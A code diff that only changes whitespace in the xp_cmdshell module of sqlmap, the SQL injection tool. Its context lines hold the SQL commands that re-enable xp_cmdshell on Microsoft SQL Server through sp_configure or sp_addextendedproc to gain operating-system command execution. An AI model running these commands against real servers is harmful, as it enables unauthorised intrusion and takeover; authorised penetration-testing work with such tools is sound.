@@ -56,11 +56,11 @@ class xp_cmdshell:
         inject.goStacked(cmd)
 
     def __xpCmdshellConfigure2005(self, mode):
-        debugMsg  = "configuring xp_cmdshell using sp_configure "
+        debugMsg = "configuring xp_cmdshell using sp_configure "
         debugMsg += "stored procedure"
         logger.debug(debugMsg)
 
-        cmd  = "EXEC master..sp_configure 'show advanced options', 1; "
+        cmd = "EXEC master..sp_configure 'show advanced options', 1; "
         cmd += "RECONFIGURE WITH OVERRIDE; "
         cmd += "EXEC master..sp_configure 'xp_cmdshell', %d " % mode
         cmd += "RECONFIGURE WITH OVERRIDE; "
@@ -69,12 +69,12 @@ class xp_cmdshell:
         return cmd
 
     def __xpCmdshellConfigure2000(self, mode):
-        debugMsg  = "configuring xp_cmdshell using sp_addextendedproc "
+        debugMsg = "configuring xp_cmdshell using sp_addextendedproc "
         debugMsg += "stored procedure"
         logger.debug(debugMsg)
 
         if mode == 1:
-            cmd  = "EXEC master..sp_addextendedproc 'xp_cmdshell', "
+            cmd = "EXEC master..sp_addextendedproc 'xp_cmdshell', "
             cmd += "@dllname='xplog70.dll'"
         else:
             cmd = "EXEC master..sp_dropextendedproc 'xp_cmdshell'"
@@ -134,7 +134,7 @@ class xp_cmdshell:
 
     def xpCmdshellInit(self):
         if kb.xpCmdshellAvailable is False:
-            infoMsg  = "checking if xp_cmdshell extended procedure is "
+            infoMsg = "checking if xp_cmdshell extended procedure is "
             infoMsg += "available, please wait.."
             logger.info(infoMsg)
 
@@ -145,10 +145,10 @@ class xp_cmdshell:
                 kb.xpCmdshellAvailable = True
 
             else:
-                message  = "xp_cmdshell extended procedure does not seem to "
+                message = "xp_cmdshell extended procedure does not seem to "
                 message += "be available. Do you want sqlmap to try to "
                 message += "re-enable it? [Y/n] "
-                choice   = readInput(message, default="Y")
+                choice = readInput(message, default="Y")
 
                 if not choice or choice in ("y", "Y"):
                     self.__xpCmdshellConfigure(1)
@@ -169,7 +169,7 @@ class xp_cmdshell:
                             kb.xpCmdshellAvailable = True
 
                         else:
-                            warnMsg  = "xp_cmdshell creation failed, probably "
+                            warnMsg = "xp_cmdshell creation failed, probably "
                             warnMsg += "because sp_OACreate is disabled"
                             logger.warn(warnMsg)
 
